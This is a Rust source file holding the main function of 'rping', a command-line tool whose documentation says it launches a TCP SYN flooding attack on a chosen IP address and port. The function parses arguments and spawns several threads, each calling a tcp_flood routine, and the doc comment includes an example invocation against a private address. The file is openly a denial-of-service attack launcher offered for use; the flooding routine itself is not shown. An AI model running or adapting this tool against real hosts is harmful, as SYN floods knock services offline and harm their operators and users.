/// The main entry point of `rping`.
///
/// It parses command-line arguments using the `clap` crate, configures the SYN flooding parameters based on
/// the provided command-line options, and initiates a TCP SYN flooding attack on the specified target.
///
/// # Arguments
/// * `--target` - The target IP address for the SYN flooding attack.
/// * `--size` - The length of SYN packets to be sent.
/// * `--port` - The target port number for the SYN flooding attack.
///
/// # Examples
/// ```
/// // Run the `rping` CLI with a target IP address, packet length, and target port.
/// rping --target 192.168.1.1 --size 100 --port 80
/// ```
///
/// # Errors
/// The function handles errors gracefully and prints out error messages if the SYN flooding attack fails,
/// if the target is missing, etc.
fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(feature = "cli")]
    {
        use clap::Parser;
        use rping::cli::Cli;
        use rping::utils::tcp_flood;
        use std::thread;

        // Parse command-line arguments
        let args = Cli::parse();

        if !args.target.is_empty() {
            let mut handles = vec![];

            for _ in 0..args.threads {
                let args_clone = args.clone();

                let handle = thread::spawn(move || {
                    tcp_flood(
                        args_clone.size,
                        &args_clone.target,
                        args_clone.port.try_into().unwrap(),
                    );
                });

                handles.push(handle);
            }

            for handle in handles {
                handle.join().unwrap();
            }
        }
    }
    Ok(())
}
